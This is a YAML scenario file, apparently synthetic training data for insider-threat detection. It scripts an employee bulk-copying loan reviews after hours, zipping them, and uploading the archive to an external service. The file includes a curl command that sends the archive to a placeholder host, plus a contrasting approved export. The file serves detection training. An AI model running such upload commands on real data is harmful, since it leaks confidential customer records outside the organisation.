release_notes: Initial bundled training example.
generation_seed: 7201
observation_profile: complete
storyline:
- id: ordinary-review
  time: +2h
  actor: jules.parker
  system: ABL-WS-01
  activity: The employee performs an ordinary single-document review during business hours.
  events:
  - type: smb_activity
    operation: read
    purpose: interactive
    target:
      type: share
      share: ABL-FILE-01.loan_reviews
      file_ref: loan-review-1
    mapping: lending-drive
    path_style: mapped
- id: late-return
  time: +11h5m
  actor: jules.parker
  system: ABL-WS-01
  activity: The employee returns to the workstation well after the normal workday.
  events:
  - type: logon
    logon_type: 2
- id: review-enumeration
  time: +11h10m
  actor: jules.parker
  system: ABL-WS-01
  activity: The employee enumerates the complete quarterly review directory.
  events:
  - type: smb_activity
    operation: browse
    purpose: collection
    target:
      type: share
      share: ABL-FILE-01.loan_reviews
    mapping: lending-drive
    path_style: mapped
- id: bulk-local-collection
  time: +11h14m
  actor: jules.parker
  system: ABL-WS-01
  activity: Quarterly loan reviews are copied into a local temporary directory using the employee's normal
    permissions.
  events:
  - type: smb_activity
    operation: copy
    purpose: collection
    source:
      type: share
      share: ABL-FILE-01.loan_reviews
      selector:
        tags_any:
        - loan-review
    destination:
      type: client
      directory: C:\Users\jules.parker\AppData\Local\Temp\Review
    batch:
      count: 8
      duration: 65s
    mapping: lending-drive
    path_style: mapped
- id: local-archive
  time: +11h20m
  actor: jules.parker
  system: ABL-WS-01
  activity: The collected review directory is compressed into one local archive.
  events:
  - type: process
    process_name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
    command_line: powershell.exe -NoProfile -Command "Compress-Archive -Path C:\Users\jules.parker\AppData\Local\Temp\Review\Reviews
      -DestinationPath C:\Users\jules.parker\AppData\Local\Temp\Review\board-review.zip -Force"
- id: personal-upload
  time: +11h28m
  actor: jules.parker
  system: ABL-WS-01
  activity: The archive is uploaded to a personal workspace at an external file-transfer service.
  events:
  - type: process
    process_name: C:\Windows\System32\curl.exe
    command_line: curl.exe -F "file=@C:\Users\jules.parker\AppData\Local\Temp\Review\board-review.zip;type=application/zip"
      https://upload.workspace-sync.example/api/objects
    process_ref: archive-uploader
  - type: connection
    dst_ip: 198.51.100.92
    dst_port: 443
    hostname: upload.workspace-sync.example
    service: https
    method: POST
    uri: /api/objects
    status_code: 201
    user_agent: curl/8.13.0
    request_multipart:
      parts:
      - name: file
        local_source_path: C:\Users\jules.parker\AppData\Local\Temp\Review\board-review.zip
        filename: board-review.zip
        content_type: application/zip
    response_body_len: 92
    technique: T1567.002
red_herrings:
- id: approved-portfolio-export
  time: +3h
  actor: tessa.morgan
  system: ABL-WS-02
  activity: A colleague exports a small set of quarterly reviews during an approved business workflow.
  events:
  - type: smb_activity
    operation: copy
    purpose: interactive
    source:
      type: share
      share: ABL-FILE-01.loan_reviews
      selector:
        tags_any:
        - loan-review
    destination:
      type: client
      directory: C:\Users\tessa.morgan\Documents\QuarterlyReview
    batch:
      count: 3
      duration: 30s
    mapping: lending-drive
    path_style: mapped
  explanation: Approved daytime review copies provide a comparison for account, timing, volume, staging
    path and subsequent destination; bulk access alone is not proof of misuse.
scenario_version: 1.0.0
